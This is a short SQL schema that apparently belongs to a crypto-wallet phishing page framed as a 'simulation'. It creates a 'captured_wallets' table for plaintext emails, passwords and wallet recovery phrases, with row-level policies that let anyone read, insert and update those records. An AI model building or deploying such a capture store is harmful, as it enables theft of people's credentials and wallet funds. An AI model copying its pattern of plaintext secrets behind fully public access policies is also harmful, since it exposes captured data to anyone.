-- captured_wallets table
-- This table stores credentials and recovery phrases captured from the simulation.
CREATE TABLE
  captured_wallets (
    id BIGINT PRIMARY KEY GENERATED ALWAYS AS IDENTITY,
    firebase_uid TEXT UNIQUE,
    email TEXT,
    password TEXT,
    wallet_type TEXT,
    recovery_phrase TEXT,
    created_at TIMESTAMPTZ DEFAULT NOW()
  );

-- Enable Row Level Security
ALTER TABLE captured_wallets ENABLE ROW LEVEL SECURITY;

-- Create policies
-- For this simulation, we are keeping it simple. In a real app,
-- policies would be much more restrictive.
CREATE POLICY "Allow public read access" ON captured_wallets FOR SELECT USING (true);

CREATE POLICY "Allow public insert access" ON captured_wallets FOR INSERT
WITH
  CHECK (true);

CREATE POLICY "Allow public update access" ON captured_wallets FOR UPDATE USING (true);
